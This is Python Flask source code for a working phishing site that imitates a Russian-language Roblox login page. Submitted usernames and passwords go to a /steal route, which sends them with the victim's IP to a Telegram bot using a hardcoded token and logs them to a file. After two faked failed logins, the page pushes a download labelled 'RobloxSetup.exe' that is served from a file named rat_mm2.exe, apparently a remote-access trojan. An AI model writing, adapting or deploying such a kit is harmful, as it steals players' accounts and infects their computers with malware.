from flask import Flask, request, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            background: #0a0a1a;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-form {
            background: #14142a;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.8);
            width: 340px;
            color: white;
            text-align: center;
        }
        .login-form h1 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .login-form .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .login-form .form-group label {
            display: block;
            color: #b0c4de;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .login-form .form-group input {
            width: 100%;
            padding: 12px;
            background: #0a0a1a;
            border: 1px solid #2a2a4a;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        .login-form .form-group input:focus {
            border-color: #00bfff;
        }
        .login-form button {
            width: 100%;
            padding: 12px;
            background: #00bfff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-form button:hover {
            background: #009acd;
        }
        .alternate-options {
            margin-top: 15px;
            font-size: 14px;
            color: #6a8aae;
        }
        .alternate-options a {
            color: #00bfff;
            text-decoration: none;
        }
        .alternate-options a:hover {
            text-decoration: underline;
        }
        .download-btn {
            display: none;
            margin-top: 15px;
            padding: 12px;
            background: #00b894;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .download-btn:hover {
            background: #00a381;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h1>Войти в Roblox</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Имя пользователя (email или телефон)</label>
                <input type="text" id="username" required>
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit">Войти</button>
        </form>
        <div class="alternate-options">
            <a href="#">Создать аккаунт</a>
            <span>·</span>
            <a href="#">Войти с другого устройства</a>
        </div>
        <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
    </div>

    <script>
        let attempts = 0;

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert('Заполните все поля');
                return;
            }

            // Отправка в Telegram
            try {
                await fetch('/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ login: username, pass: password })
                });
            } catch {}

            attempts++;
            alert('Неверный логин или пароль. Попробуйте снова.');

            if (attempts >= 2) {
                document.getElementById('message') || document.createElement('div');
                document.getElementById('downloadBtn').style.display = 'block';
                alert('⚠️ Обнаружена проблема с входом. Скачайте обновление Roblox.');
            }

            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        });

        document.getElementById('downloadBtn').addEventListener('click', function() {
            window.location.href = '/download/roblox_setup.exe';
            this.innerText = '✅ Файл скачан! Запустите для входа.';
            this.disabled = true;
        });
    </script>
</body>
</html>
    '''

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')
    ip = request.remote_addr

    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)

    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")

    return {"status": "ok"}, 200

@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "File temporarily unavailable", 404

@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "No logs"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
